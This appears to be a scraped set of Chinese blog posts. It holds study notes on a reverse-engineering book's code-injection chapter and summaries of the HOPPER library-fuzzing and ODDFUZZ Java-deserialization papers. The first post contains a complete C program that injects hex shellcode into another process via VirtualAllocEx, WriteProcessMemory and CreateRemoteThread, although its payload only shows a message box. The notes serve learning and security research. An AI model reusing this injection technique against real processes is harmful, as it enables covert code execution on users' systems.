= \n&#123;\n    0x55, 0x8B, 0xEC, 0x8B, 0x75, 0x08, 0x68, 0x6C, 0x6C, 0x00,\n    0x00, 0x68, 0x33, 0x32, 0x2E, 0x64, 0x68, 0x75, 0x73, 0x65,\n    0x72, 0x54, 0xFF, 0x16, 0x68, 0x6F, 0x78, 0x41, 0x00, 0x68,\n    0x61, 0x67, 0x65, 0x42, 0x68, 0x4D, 0x65, 0x73, 0x73, 0x54,\n    0x50, 0xFF, 0x56, 0x04, 0x6A, 0x00, 0xE8, 0x0C, 0x00, 0x00,\n    0x00, 0x52, 0x65, 0x76, 0x65, 0x72, 0x73, 0x65, 0x43, 0x6F,\n    0x72, 0x65, 0x00, 0xE8, 0x14, 0x00, 0x00, 0x00, 0x77, 0x77,\n    0x77, 0x2E, 0x72, 0x65, 0x76, 0x65, 0x72, 0x73, 0x65, 0x63,\n    0x6F, 0x72, 0x65, 0x2E, 0x63, 0x6F, 0x6D, 0x00, 0x6A, 0x00,\n    0xFF, 0xD0, 0x33, 0xC0, 0x8B, 0xE5, 0x5D, 0xC3\n&#125;;\n\nBOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) \n&#123;\n    ... // 同上\n&#125;\n\nBOOL InjectCode(DWORD dwPID)\n&#123;\n    HMODULE         hMod            = NULL;\n    THREAD_PARAM    param           = &#123;0,&#125;;\n    HANDLE          hProcess        = NULL;\n    HANDLE          hThread         = NULL;\n    LPVOID          pRemoteBuf[2]   = &#123;0,&#125;;\n\n    hMod = GetModuleHandleA(\"kernel32.dll\");\n\n    // set THREAD_PARAM\n\t// 获得LoadLibraryA与GetProcAddress的地址\n    param.pFunc[0] = GetProcAddress(hMod, \"LoadLibraryA\");\n    param.pFunc[1] = GetProcAddress(hMod, \"GetProcAddress\");\n\n    // Open Process\n\t// 打开目标进程\n    if ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS,               // dwDesiredAccess\n                                  FALSE,                            // bInheritHandle\n                                  dwPID)) )                         // dwProcessId\n    &#123;\n        printf(\"OpenProcess() fail : err_code = %d\\n\", GetLastError());\n        return FALSE;\n    &#125;\n\n    // Allocation for THREAD_PARAM\n\t// 在目标进程中分配内存pRemoteBuf[0]\n    if( !(pRemoteBuf[0] = VirtualAllocEx(hProcess,                  // hProcess\n                                         NULL,                      // lpAddress\n                                         sizeof(THREAD_PARAM),      // dwSize\n                                         MEM_COMMIT,                // flAllocationType\n                                         PAGE_READWRITE)) )         // flProtect\n    &#123;\n        printf(\"VirtualAllocEx() fail : err_code = %d\\n\", GetLastError());\n        return FALSE;\n    &#125;\n\n\t// 在pRemoteBuf[0]中写入param\n\t// 在目标进程中写入LoadLibraryA与GetProcAddress的地址\n    if( !WriteProcessMemory(hProcess,                               // hProcess\n                            pRemoteBuf[0],                          // lpBaseAddress\n                            (LPVOID)&amp;param,                         // lpBuffer\n                            sizeof(THREAD_PARAM),                   // nSize\n                            NULL) )                                 // [out] lpNumberOfBytesWritten\n    &#123;\n        printf(\"WriteProcessMemory() fail : err_code = %d\\n\", GetLastError());\n        return FALSE;\n    &#125;\n\n    // Allocation for ThreadProc()\n\t// 分配内存\n    if( !(pRemoteBuf[1] = VirtualAllocEx(hProcess,                  // hProcess\n                                         NULL,                      // lpAddress\n                                         sizeof(g_InjectionCode),   // dwSize\n                                         MEM_COMMIT,                // flAllocationType\n                                         PAGE_EXECUTE_READWRITE)) ) // flProtect\n    &#123;\n        printf(\"VirtualAllocEx() fail : err_code = %d\\n\", GetLastError());\n        return FALSE;\n    &#125;\n\t// 将ThreadProc的hex代码写入到pRemoteBuf[1]\n    if( !WriteProcessMemory(hProcess,                               // hProcess\n                            pRemoteBuf[1],                          // lpBaseAddress\n                            (LPVOID)&amp;g_InjectionCode,               // lpBuffer\n                            sizeof(g_InjectionCode),                // nSize\n                            NULL) )                                 // [out] lpNumberOfBytesWritten\n    &#123;\n        printf(\"WriteProcessMemory() fail : err_code = %d\\n\", GetLastError());\n        return FALSE;\n    &#125;\n\t// 创建远程线程\n    if( !(hThread = CreateRemoteThread(hProcess,                    // hProcess\n                                       NULL,                        // lpThreadAttributes\n                                       0,                           // dwStackSize\n                                       (LPTHREAD_START_ROUTINE)pRemoteBuf[1], // lpStartAddress\n                                       pRemoteBuf[0],               // lpParameter\n                                       0,                           // dwCreationFlags\n                                       NULL)) )                     // lpThreadId\n    &#123;\n        printf(\"CreateRemoteThread() fail : err_code = %d\\n\", GetLastError());\n        return FALSE;\n    &#125;\n\n    WaitForSingleObject(hThread, INFINITE);\t\n\n    CloseHandle(hThread);\n    CloseHandle(hProcess);\n\n    return TRUE;\n&#125;\n\nint main(int argc, char *argv[])\n&#123;\n    DWORD dwPID     = 0;\n\n\tif( argc != 2 )\n\t&#123;\n\t    printf(\"\\n USAGE  : %s &lt;pid>\\n\", argv[0]);\n\t\treturn 1;\n\t&#125;\n\n\t// change privilege\n\tif( !SetPrivilege(SE_DEBUG_NAME, TRUE) )\n        return 1;\n\n    // code injection\n    dwPID = (DWORD)atol(argv[1]);\n    InjectCode(dwPID);\n\n\treturn 0;\n&#125;\n\nQ：代码注入的InjectCode函数和汇编编写的注入相比较\nQ：代码注入\n\n用C语言编写ThreadProc()函数\n\n代码注入的InjectCode函数的THREAD_PARAM中包含库地址、数据参数ReverseCore等等\n\n在InjectCode中，设置THREAD_PARAM，包含设置字符串。\n\n分配THREAD_PARAM内存，写入THREAD_PARAM\n\n分配code内存，写入ThreadProc()\n\n调用CreateRemoteThread执行函数\n\n\n\n\n汇编编写的注入\n\n用汇编编写ThreadProc()函数，并保存它的内存区域。在g_InjectionCode数组中引用ThreadProc()函数\n设置Param。这里只设置库地址，不需要设置字符串，因为已经包裹在ThreadProc()函数中了\n分配param内存，设置Param\n分配code内存，设置为g_InjectionCode\n调用CreateRemoteThread执行\n\n\n\n28.5 调试练习按照书上操作，让它停在指定位置\n\n28.6 详细分析之前编写的ThreadProc()Q：生成栈帧指令，记住55 8BEC\n\n\n因为后面会压字符串入栈，这里生成的栈帧就可以在ThreadProc()函数终止时把栈清理干净\n\nTHREAD_PARAM指针\n\nESP + 8是传入函数的第一个参数，这里指THREAD_PARAM指针\n\nTHREAD_PARAM结构体的定义，它的成员是两个函数指针\n\n\n执行完这条指令后，ESI的值变为00E80000，查看内存区域，用Long address显示，看到了loadlibraryA和GetProcAddress的值\n\n\n\nUser32.dll字符串Q：下面这3行代码把User32.dll字符串压入栈中\n\n\n这种技术仅用于汇编语言编写的程序中\n\n6C是ACSII码值，表示的是字母”l”，所以最终压入栈的字符串是\\0\\0ll\n\n下面两条push用来把字符串”d.23”和”resu”压入栈中\n\n由于栈的逆向扩展和x86cpu采用小端序存储的方式，所以要这么压入栈\n\n因为栈是逆序存储，所以要最后压resu\n因为是小端序，所以是resu\n\n\n\nQ：PUSH ESP指令\n\nESP中存的是user32.dll字符串的起始地址\n\n\n\n使用push指令可以把指定字符串压入栈，注入代码时，不用再另外注入字符串数据\n\n32位的os中，一次只能将4bytes的数据压入栈\n\nLoadLibraryA() API拥有一个参数，用来接收一个字符串的地址，该字符串是要加载的DLL文件的名称\n\n当前ESP的值是00F1FF68，是user32.dll字符串的起始地址\n\n因为字符串压入栈中，相当于保存在了内存中，这里是Push esp保存的也是字符串的起始地址(也是在栈内的地址)，当你调用函数的时候，首先读取到的是00F1FF68，也就是会去00F1FF68处取字符串，所以没有问题，就应该压入ESP。\n因为后来会清除栈帧，这里也说明了字符串是临时存储的，并不会一直保存在内存中\n\n\n\n\n调用LoadLibraryA(“user32.dll”)\n\n\n由前面可知，ESI中存储的是LoadLibraryA()的起始地址，所以这里是在调用LoadLibraryA()函数，同时会加载作为参数传入的user32.dll，由于notepad.exe已经加载了user32.dll，所以只会返回加载的地址\n\nCALL DS:[ESI] &#x3D;&#x3D;  CALL [E80000] &#x3D;&#x3D; CALL 766C2450 &#x3D;&#x3D; CALL LoadLibraryA()\n\n\n函数返回的地址保存在EAX中，此时EAX的值是75B60000\n\n\n用alt + e查看 executable modules，可以看到当前程序中加载的所有dll，可以看到user32.dll的base就是75B60000\n\n\n\n调用GetProcAddress(hMod, “MessageBoxA”)Q：下面这三条push指令把字符串MessageBoxA压入栈\n\n和前面一样，还是栈逆序+小端序\n\n\nQ：调用GetProcAddress(hMod, “MessageBoxA”)\n\n\n这里还是和前面一样，调用函数之前，先Push ESP\n\n然后Push EAX，是刚才user32.dll的地址，把它作为函数的第一个参数hMod传入\n\n调用GetProcAddress函数，执行函数之后，useer32.dll.MessageBoxA() API的起始地址就会保存到EAX寄存器，\n\n\n\nQ：压入MessageBoxA()函数的第四个参数\n\nMessageBoxA() API如下：共有4个参数\n\n\nPush 0压入第四个参数，也就是uType的值，当它是0，表示消息对话框为MB_OK，仅显示一个OK按钮\n\n\nQ：压入MessageBoxA()函数的第三个参数 ReverseCore\n\n这里用CALL指令将包含在代码间的字符串数据地址压入栈\n之前是用Push直接压入栈的\n\n\n\n\n\n很明显从33 到3E是程序的代码区，但是内容实际上是ReverseCore字符串，也就是ReverseCore字符串的首地址是EA0033，被用作第三个参数lpCaption\n\n这里发现33 到3E是无法设置断点的，因为是字符串区域，并非代码区域，命令只会进入到CALL指令中接着执行\n\n\n将字符串作为参数传递给函数前，需要先把字符串地址压入栈\n\n用f7进入call 函数后，发现栈内已经有EA0033\n\n\n这是因为CALL 00EA003F这个函数调用指令之前，会先push 返回地址，也就是当前指令的下一条地址，即00EA0033，再jump 到00EA003F，所以也就把EA0033的字符串压入到栈中\n\n\n\nQ：压入MessageBoxA()的第二个参数lpText\n（地址前缀不太一样，因为我重新运行了）\n\n\n44到57同样是字符串区域，并非代码\n\n这里是压入www.reversecore.com字符串\n\n\n\nQ：压入MessageBoxA()的第一个参数 NULL\n\n\nPUSH 0指令将MessageBoxA()API的第一个参数hWnd压人栈，该参数用来确定消息对话框所属的窗口句柄，这里压入NULL值，创建一个不属于任何窗口的消息对话框。\n\n接着用CALL EAX，调用MessageBoxA() API，EAX中存储着MessageBoxA()的起始地址，是调用GetProcAddress后返回的值\n\n执行后，弹出对话框\n\n\n\n设置ThreadProc()函数的返回值\n\n注人notepad.exe进程的代码(ThreadProc()线程函数)执行完之前，还需要做一些准备工作。\n用XOR EAX EAX指令将线程函数的返回值设置为0。前面学过函数的返回值使用EAX寄存器\n\n\n\n\n\n\n\n提示\nXOR EAX EAX指令能够又快又好地将EAX寄存器初始化为0(对 CPU而言，它比使用MOV EAX 0指令更简单快捷)。\n\n\n删除栈帧及返回返回\n\n把EBP的值给ESP,也就是清除栈帧，POP EBP，恢复原来的栈base指针，画画图就明白了\n\n","slug":"re-engineer-core-principle-03","date":"2023-12-05T02:11:20.000Z","categories_index":"","tags_index":"re","author_index":"XyM4ster"},{"id":"ac1f5803919fdd2ccf7eeca40ae91dc2","title":"HOPPER-CCS-2023","content":"ABSTRACTQ：现有的fuzz drivers的问题\n\n不能完全覆盖entries in libraries\n他们的质量取决于开发人员对于代码的理解\n\nQ：提出的Hopper\n\n可以fuzz libraries\n不需要其他的知识去craft  fuzz drivers\n把fuzz libraries转换成InTerpreter fuzzing(解释性fuzz)\n链接到被测library的Interpreter 可以解释描述任意API使用的输入\n\nQ：\n\n为了给解释器生成semantically correct input(语义正确的)输入,hopper学习library中API内和API间的constraint(约束)，\nMutate program 通过grammar awareness(语法意识)\n\nQ：hopper的效果\n\n作者提出的inter intra API constraint的学习方法可以learn 隐式的constraint\nexplore a vast range of API usages\n\n&#x3D;&#x3D;Q:我理解的对于library的fuzz&#x3D;&#x3D;\n\n应该是对于Library中的api进行fuzz，看有没有什么漏洞??\n\nIntroductionQ：AFL和LibFuzzer\n\n是基于coverage的灰盒测试，\n不需要知道程序的input format 或者程序的规范\n\nQ：Constraint-based gredbox fuzzer\n\n通过constraint-solving的技术去reach 那些被复杂的constraint保护的code branch\n\nQ：grey-box fuzzing测试binary programs很有用\n\n但是测试libray中的API不太行\n\nQ：为了用当前的针对library的fuzzer\n\n需要手动的制作一个fuzz driver\n这个driver使用fuzzer提供的类型无关的input\n并且把byte stream转换成API的参数\n\n\n\nQ：但是写一个高质量的fuzz driver很费劲\n\n需要对library有很深入的理解\n现有的fuzz driver也只是覆盖一小部分API\n对于大家用的很少的API，缺乏测试\n因此需要一个out-of-box的library fuzzer\n\nQ：对于library fuzzing来说\n\n需要当调用API的时候使用正确的参数类型\n需要满足API内和API间(inter and intra API)的constraints\n否则就会出现crash\n\nQ：举个例子\nares_send(ares_channel channel, char *qbuf,\nint qlen, ares_callback callback, void *arg) \n\n\n为了测试这个需要调用ares_init(ares_channel *channelptr) 去满足Inter-API constraint\nqlen是qbuf的长度\n把callback设置成非空，用ares_callback类型，满足 intra API constraint\n\nQ：但是为了做到上面这些很难\n\n因为关于这些constraint在文档中是很scattered分散的，你很难以一个自动化的方式收集他们\n\nQ：现有的方法中提出learning-based和model-based方法生成fuzz drivers\n\n列举了一大堆问题\n反正就是有些drivers要么需要大量的人力参与\n或者效果也不好，甚至一些常用的API都没有包括\n\nQ：hopper\n\nfuzz API不需要任何的external knowledge\n收到coverage-based fuzzer的启发，learn valid format通过mutate random seeds\nhopper通过mutate API call and arguments（API调用和参数）来学习API的使用\n如果执行的mutate program触发了一个新的路径或者新的crash，hopper基于动态反馈推断API内和API之间的constraint\n\nQ：为了实现上面的最后一点(动态反馈推断这个)\n\n作者用了DSL（Domain-Specific Language）来描述任意的API使用\n\nDSL的输入会被interpreted(解释)，通过一个链接到library under test的轻量级的interpreter\n\n因此，就把对于library的fuzz转变成了对于Interpreter的fuzz\n\n\nQ：具体的执行过程\n\nfuzzer现在负责以DSL形式编码的程序，并把它给interpreter\n\n之后这个解释器就会执行程序看是否有Unexpected behaviors发生\n\n由于hopper执行grammar-aware的mutation，并且可以推断constraint，因此hopper可以生成有效的输入，去探索API的不同使用，可以减少误报\n\n\nBackgroundLibrary FuzzingQ：测试library中的API来说，目前常用的就是LibFuzzer，用Libfuzzer的步骤\n\nCraft a fuzz drivers：fuzz driver是一个描述library API使用的program，包括一系列API的调用和API的参数。一个高质量的fuzz driver需要提供一个entry去探索库中尽可能多的代码\n除了要关注这个API的参数，也需要关注相关的API，\n但是枚举API显然很浪费时间，目前的fuzz driver只包括常用的API\n\n\n*Specify the format of input.*：由于LibFuzzer是盲目的创建字节流，因此它很难创建结构化的输入满足intra-API的constraints。\n\nFuzzing InterpretersGrammar-aware grey-box fuzzings 在program中很成功，它可以解析input，尤其是interpreters。\nfuzzing interpreters的两个关键要素：\n\nGrammar-aware input mutation：它可以基于encoding grammar(编码语法)把input解析为IR，并且在满足constraings的情况下mutate IR\nCoverage guided fuzzing：通过coverage作为反馈，去触发更deeper branch，找到新的bug。通过和上面Grammar-aware input mutation的结合，fuzzer可以合成新的input，cover更多的分支，找到更多的bug\n\nQ：综上，重要的是\n\nlibrary的fuzz driver表示为input实现一个解释器，然后对这个解释器进行fuzz\n\nMCF将type-agnostic(与类型无关的)byte inpus解释为typed values，提供给有限的API序列调用，这只能探索部分libraries\n3 Design3.1 OverviewQ：hopper架构\n\na grammar-aware fuzzer：生成DSL编码形式的输入\n\na lightweight interpreter：执行输入\n、\n\n\n\nQ：工作流程\n\nfuzzer通过调用library API生成高质量的input，\n\n从library headers中提取出function signatures和type definition，提供了API function和argument type之间的关系\n\n\n之前我笔记中的，这个&lt;&gt;里的就是method siganature，理解成方法的定义\n\n\n通过利用上面的信息，hopper通过随机混合API functions和arguments，生成一个API调用的序列\n\n\n\n随着种子突变和代码覆盖率的feedback，就会探索更多的分支\n\nhopper执行的是type-aware argument mutation  和learns intra- and inter-API constraints \n\n解释器利用input，调用library中的API\n\n在编译阶段，library链接到interpreter。‘\n\n在链接之前，hopper检测二进制文件捕获执行过程中的内部状态，例如代码覆盖率\n\n当新的input到达的时候，interpreter会根据DSL的语法把input解释称statement\n\n\n3.2DSL and Input Interpretation3.2.1 DSLQ：\n\nHopper中的interpreter会把DSL程序作为Input\n\nQ：DSL语法\n\n\n每个DSL program包含一个statement作为他的基本组成\n每个statement有一个index，它的后继可以引用\n\n\n\nQ：很像指针分析中的定义\n在DSL中把在(mcfs)manually crafted fuzzers中的fuzzing behaviors分成5种statements\n\nload：可以直接把输入数据的类型转换成一种具体的类型\ncall \nupdate\nassert\nfile statement\n\nQ：本文的DSL的特点\n\n不支持条件表达式\n通过枚举的方式去找到API\n\n\n\n\n3.2.2 Interpreter\ninterpreter会解析DSL程序，执行里面的statements，监测在执行每个statement之后的状态。\n\nQ：为了调用library API\n\n在编译阶段，Hopper会把interpreter和libray链接在一起\n它也构建一个table，对应每个function的名字和它相关的caller，基于library的header files\n程序执行期间，caller会把value转换成需要的参数类型，并且调用这个参数相关的函数\n\nQ：在链接到interpreter之前\n\nhopper会用count branch的代码监测library binaries\nhook compare instructions and resource management functions,如malloc open\n之后在运行时收集feedback：\nOptional Branch Tracking：当一个API以question mask(?)结尾时，对这个call用branch tracking\nContext-sensitive Code Coverage：把每个API的name的hash作为上下文\nOverflow Detection：如果statement加载了一个数组，会给这个数组添加一个金丝雀，来判断数组是否会溢出\nUse-after-free Detection:interpreter包含一系列memory chunk，通过malloc和free。如果一个指针指向的memory chunk被释放了，Interpreter会退出程序，避免释放重引用\n\n\n\nQ：关于运行时的问题\n\nlibfuzzer使用的fuzz driver在同一个循环中运行\n但是很难生成一个程序在退出前重置所有的资源\nHopper的interpreter是把每个input在一个单独的进程中运行\n一旦一个DSL程序终止了，操作系统会破坏进程，释放所有分配的资源，\n这就允许interpreter在执行DSL程序时，不需要释放资源\n\n3.3 Grammar-aware Input\nQ：hopper不同的地方\n\n其他的fuzzer会基于input grammar遍历所有可能的语义\nHopper是集中于生成各种有效的API call\n\nQ：这个过程包括两个阶段，在Fig 4中\n\nhopper基于在function signature可利用的信息生成input去初始化一个种子池\n从种子池中选择输入，并让他们基于coverage feedback来进行mutate\n\nPilot phase\nQ：在这个阶段要做的事\n\nHopper首先draw skeletons of the input 绘制input的轮廓,推断 constraints\n开始时，seed pool中没有input\n因此,hopper 尝试为每个API 基于他们的signature和learn constraints 生成简单的input(具体在3.4)\n为了实现这个，Hopper在库中选择一个API 作为target，给他随机生成一个call statement\n这包括生成参数和(insert related calls that introduce the necessary context)插入引入必要上下文的相关的调用\n\n\n这些statements最终会形成一个input，由解释器执行\n\nQ：之后\n\n如果input触发了library中没有crash的新的path，hopper把这个input保存到seed pool中，用于之后的mutation。\n为了避免来自其他的call触发不相关的coverage feedback，hopper只会track target的call\n\nQ：那如何生成call statement呢? 用算法1\n\n每个参数根据在function signature中的type来生成，使用下面三个operator中的一个来生成argument：\n\n\nhopper选择一个现有的statement，它的type和这个argument的type相同\n这argument是通过insert a new API 调用获得的。\nhopper随机选择一个API function,它的return type和这个argument匹配，递归的给它生成一个call statement。\n新的call statement放在当前的前面\n在这个new call statement的后面添加一个表示call statement是否成功运行的assertion statement\n例如一个 non-null assertion statement被添加到一个pointer-type returned call statement(指针类型的call statement)后面\n\n\n\n\n使用from scratch从头创建的有typed value的load statement\n\n\n\nQ：hopper的insert other API call\n\nhopper影响target call的执行通过insert other API call来该百年程序的内部状态\n它确定API的优先级，利用对于target call有重复的non-primitive argument types（非基本参数类型），尽可能重用overlap的argument\n\n为了避免程序变得过于复杂，hopper会停止生成new call，如果statement的长度超过了临界值，或者递归深度变的太深。\nQ：以Fig 3为例，\n\n为了生成第13行的program\n随机选择 line 4的返回值\n生成两个integer的value， line 11 line 12作为arguments\n并且创建一个调用(line 10)，他可能会修改现有的参数\n\n\n\n\nEvolution Phase\n在运行几轮之后，hopper进入到Evolitopn phase(进化阶段)，目的是构建更复杂的程序，基于skeleton inputs。\nQ：为了实现这个\n\nhopper从seed pool中选择一个input，并基于它的types进行突变\nguided by the execution branch coverage，他就更可能扩展更深的代码，更可能找到bug\n\nQ：Hopper mutate program statements用下面的5步\nStep 1\n\n首先根据优先级从seed pool中选择一个input\nfresh seeds有更高的优先级被选择，一位内他们更可能reach deeper paths\n\nStep 2\n\nhopper从Input中选择statements进行mutate，根据他们的weights\nassert、file、update statements权重是0，不突变，load 和call statemetn的权重由他们的复杂性决定\n\nStep 3\n\nhopper用相应的策略对load statements和call statements进行突变（3.3. 1 和 3.3.2中写了）\n\nStep 4\n\nhopper基于在fuzzing期间学到的constraints，refine(优化) 对于API的input(3.4中写的)\n\nStep 5\n\nhopper minimize input去remove 冗余的statements，这些statements不影响reaching  path，并increase mutation的搜索空间（3.3.3）\n\n3.3.1 Call statement Mutation\nQ：call statement mutation的策略\n\n取代一个参数用一个和他有同样类型的新的参数(算法1的line4 到line 24)\n在target call之前insert a new call(line 27 to line 29)。这个insert call 可能修改target call参数的values，或者改变library中的global states。Hopper通过branch feedback决定了insert call的有效性，(细节在3.4.2)\n更新call 的返回值。一个update statement被插入到call的后面，用新值重写返回值。\n\n3.3.2 Type-aware Value MutationQ：因为Library中的argument type非常多\n\n所以hopper需要生成合适的类型给这些arguments，当调用相关的API时\n\nQ：对于value mutation来说，也是上面这样\n\n根据value的type进行mutation可能更高效的探索新的状态\n\nQ：为了实现这个\n\nHopper递归解析在header files中的type definitions和type aliases\n生成new typed values使用下面的rules：\nPimitive Type。几乎所有的基本类型是数值类型numerical types。hopper生成小范围的均匀分布的numbers。此外，Hopper对原始类型应用四种mutation:\n设置一个Intersting value(例如 0x80000000 给int)\nflip a bit or a byte\n加或者减一个small number\n如果这个value是操作数中的一个，就设置为从comparison instruction(比较指令)收集的字面量\n\n\nArray。基于数组的长度和元素类型，hopper生成元素的序列。如果长度是变量，hopper随机选择一个长度。在mutation期间，hopper在数组中选择一个或者更多的元素，并分别进行突变。此外，hopper可以重新设置数组的大小通过插入或者remove元素，如果长度不固定的话\nStructure。自定义的structure type（结构类型） 的value通过递归生成他们的fields来创建。当突变自定义的structure values时，hopper 随机在structure中选择一个 field，并根据他的type进行突变。\nTrivial Pointer\nnon-trivial pointer\n\n\nbyte array可能包含自己编码的数据，这个在header files中没定义。cJSON_ParseWithOpt in Figure 2 中用Json形式解析byte array，hopper给byte array应用AFL的随机 mutation\n\n3.3.3 input MinimizationQ：为什么有输入最小化\n\n因为冗余的statements和values会降低程序的执行速度，并且在Mutate期间扩展搜索空间，让fuzz变得低效\n\nQ：为了解决上面的问题，hopper应用下面的两个步骤去minimize input\n\n\nMinimize inputs after mutation and refinement.在backward input中，hopper检查statement，排除target call statement。如果一个statement不再被其他statement引用，就删除它。\nMinimize inputs that trigger new paths。对于不对exectuion path有影响的call，hopper就移除它，同时也remove在load statement阶段荣誉的值。尽可能的设置pointer values为null或者缩小array的length。如果执行路径仍然不变，hopper保留input中的mutation.\n\n3.4 Constraint Learning为了正确的\n\n就为这个空指针对应的参数添加一个指针非空（NON-NULL）约束，避免对此参数生成空指针。\n考虑到不同库之间上下文的多样性，我们无法对API间的约束给出一个精确的定义，而是换了一种思路：\n如果生成或是变异后的程序恰巧捕捉到了某一种API间的特殊关系（触发了新的代码覆盖），那么就将这个程序保存到我们的语料库中。此外，Hopper还会分析出引入新的代码覆盖的具体API参数，然后针对该参数对程序进行切片，将与该参数相关的所有语句保存在一个“有效参数”(effective argument)的语料库中，以供下一次需要为API生成对应类型的参数时复用。\n\n4 Implementation从C header file中提取出来的语义来生成input\n用rust的trait和macro(宏)来实现。\n","slug":"HOPPER-CCS-2023","date":"2023-11-14T02:06:39.000Z","categories_index":"","tags_index":"论文","author_index":"XyM4ster"},{"id":"9b08663ab6515ce746fcfc5eb13ac547","title":"ODDFUZZ","content":"ABSTRACTQ：对于Java反序列化漏洞，现有的解决方式\n\nstatic analysis和fuzz生成POC，用序列化的对象触发漏洞\n但是存在有效性和效率的问题\n\nQ：本文方法\n\n提出一个轻量级的static taint analysis去识别调用链\nODDFUZZ尽力locate所有的漏洞，避免误报\noddfuzz用 directed greybox fuzzing(DGF)去探索漏洞，然后生成POC测试用例去减少false positives\n\n\nODDFUZZ用一个structure-aware seed generation方法去保证测试用例的有效性\n采用混合的feedback和step-forward策略去指导directed fuzzing\n\nQ：具体实现\n\n实现了一个ODDFUZZ的prototype，并且在Java deserilization repository ysoserial上进行了评估\nODDFUZZ可以发现36个调用链中的14个，但是两个其他的state-of-the-art只能发现其中的3个\n作者也在真实的applications中进行评估，发现了6个调用链\n\nIntroductionQ：产生Java反序列化的原因\n\n因为反序列化时对象的多态，并且有像Java反射这样的技术，让精心制作的序列化对象很容易被注入\n这打破了传统的进程间数据传输的可信边界，增加了攻击面\n\nQ：Java反序列化的危害例子\n\n一个最近的0 day漏洞(Spring4Shell)在Spring框架中允许攻击者发送一个构造的Http请求去绕过Http请求解析器中的保护，导致RCE，远程代码执行\n\nQ：ODD漏洞的根本原因\n\n反序列化对象可以reach、affect目标应用中的敏感代码\nreach：in terms of control flow\naffect：in terms of data flow\nsensitive code：sink\n\n\n根据上面的特点，很显然可以用taint analysis\n\nQ：但是精度受限\n\n因为对Java反序列化的特征的支持很少\n导致false-positive（误报）和false-nagetive（漏报）\n因此就需要手工检查报告，这就很浪费时间\n\nQ：为了解决上面的问题\n\nSerHybrid[13]采用混合的分析方法\n[15]分析heap access paths去找到affect security-sensitive call site的source object\n使用fuzz生成source injection 对象去验证sink是否会到达\n\n我理解这里应该是生成的对象是否可以到达sink\nQ：上述方法的问题\n第一：\n\n由于Java的运行时多态，一条路径上的任何方法都可能被用来去构建调用链\n如果每个方法都测试一下，显然会路径爆炸\n即使用taint analysis，可能有精度问题，或者不能work因为调用链太多\n\n第二：\n\n现有的fuzz方法并不高效在生成测试用例上\n具体原因是因为一个对象的类层次结构可能很复杂，fuzz事先不知道\n\n\n而且现有的fuzz主要是覆盖率导向，争取覆盖更多的代码，而不是目标导向\n\nQ：为了解决上述的问题，作者提出了方法\n\nODDFUZZ实现了轻量级的taint analysis，在处理Java运行时多态的问题上，实现了precision和recall的平衡\noddfuzz对调用链的data constraints建模形成一个tree，使用这个tree来进行structure-aware的fuzzing\noddfuzz通过采取一个直接的fuzz通过step-forward mutation策略和hybrid feedback，去重复的reach candidate 漏洞\n\nQ：具体实现\n\n基于一个流行的Java fuzzing框架JQF实现oddfuzz\n利用ysoserial评估它\n\n我的补充Q：Java的运行时多态的例子(有点忘记了)\nclass Animal &#123;\n    public void makeSound() &#123;\n        System.out.println(\"Animal is making a sound\");\n    &#125;\n&#125;\n\nclass Cat extends Animal &#123;\n    @Override\n    public void makeSound() &#123;\n        System.out.println(\"Meow\");\n    &#125;\n&#125;\n\nclass Dog extends Animal &#123;\n    @Override\n    public void makeSound() &#123;\n        System.out.println(\"Woof\");\n    &#125;\n&#125;\n\npublic class Main &#123;\n    public static void main(String[] args) &#123;\n        Animal animal1 = new Cat();\n        Animal animal2 = new Dog();\n\n        animal1.makeSound();  // 输出 \"Meow\"，调用的是 Cat 类的 makeSound 方法\n        animal2.makeSound();  // 输出 \"Woof\"，调用的是 Dog 类的 makeSound 方法\n    &#125;\n&#125;\n\n\nJava 中的运行时多态是通过方法重写（Method Overriding）和动态绑定（Dynamic Binding）实现的。\n运行时多态允许在编译时无需确定方法的具体实现，而是在运行时根据对象的实际类型来确定调用哪个方法。这使得代码更加灵活，可以通过父类引用来调用子类的方法\n\nQ：如何理解trade-off between precision and recall\n\nrecall：理解成正确标记为污点的数据\nprecision：精度\n\n如果提高recall，就容易产生false-positive（误报），标记为污点的数据变多了。\n如果提高precison，就容易产生false-nagetive(漏报)。\nBackgroundQ：为啥叫ODD(open Dynamic Deserilization)\n\nopen：允许arbitayty objects被反序列化\ndynamic：调用多态方法或者基于反射的行为来探索很多路径\n\nQ：攻击发起的方式\n\n入口点：任何反序列化数据的地方都可以作为入口\n\n攻击者把代码片段链接到一起，形成调用链\n\n\n这里形成了一个调用链，在Apache Commons Collections4library，这会导致远程代码执行\n\n\nQ：Property-Oriented Programming(POP)\n\nto chain multilevel objects of specific classes and set certain fields to specific data values\n\n\n\n首先攻击者设置PriorityQueue的属性comparator为TransformingComparator\n设置TransformingComparator的属性transform为InvokerTransformer\n这样queue中的Object可以到达sink方法，\n当反序列化调用readObject的时候，就会实现远程代码执行。\n\nThreat model\n暴漏的入口很多，然后就可以注入了。\nQ：由于补一个反序列化的洞，很耗时，一般情况下都是通过whitelist或者Blacklist进行限制\n\n但是如果发现了一个新的调用链，那么现有的方法就失效了\n\nDirected Greybox FuzzingQ：分成两种\n\nCoverage-guided Greybox Fuzzing (CGF) ：追求代码覆盖率\nDirected Greybox Fuzzing (DGF)：被设计去guide fuzzer到一个具体的程序location，去生成POC 测试用例\n\n\nQ：DGF的工作流程\n\n静态分析\n提取call graph和control flow graph进行Inter-procedural，计算inout binary和target之间的distance\n\n\nfuzzing loop\ntarget distance和其他的fitness metric一样，像coverage 和similarity，被当成一种feedback，快速引导fuzzer到target site\n\n\n之后directed fuzzer根据feedback信息，在种子池中选择closer to target site的seed，接着分配合适的energy为Mutation\n一个种子的energy决定了多少个新的种子被生成\n\n\n之后fuzzer采取各种突变策略去控制种子朝着desired target sites进化，\n一个有smaller distance的seed会被保留到下一个loop中\n\nMotivation实现一个high recall和precision的方案，需要解决下面三个问题\nA challenge 1：Runtime PolymorphismQ：现有的方法用静态分析去检测Java 反序列化漏洞，但是存在问题\n\n因为Java的运行时多态，他的declared type，并不一定是他的最终类型\n所以很难推断程序运行时的真正路径，导致很高的false-nagative rate（误报率）\n\nQ：为了解决上面的问题，直接的方式是用CHA\n\n但是CHA考虑当前类和它的所有子类，这很容易路径爆炸\n\nQ：GadgetInspector的方法\n\n基于CHA和method overriding hierarchy\n\n他考虑data flows从method argument 到 return value 和从method argument 到method invocation\n\n是intraprocedural taint analysis\n\n没有考虑Java的运行时多态\n\n\n\nQ：FUGIO的方法\n\n是interprocedural data flow基于构建的 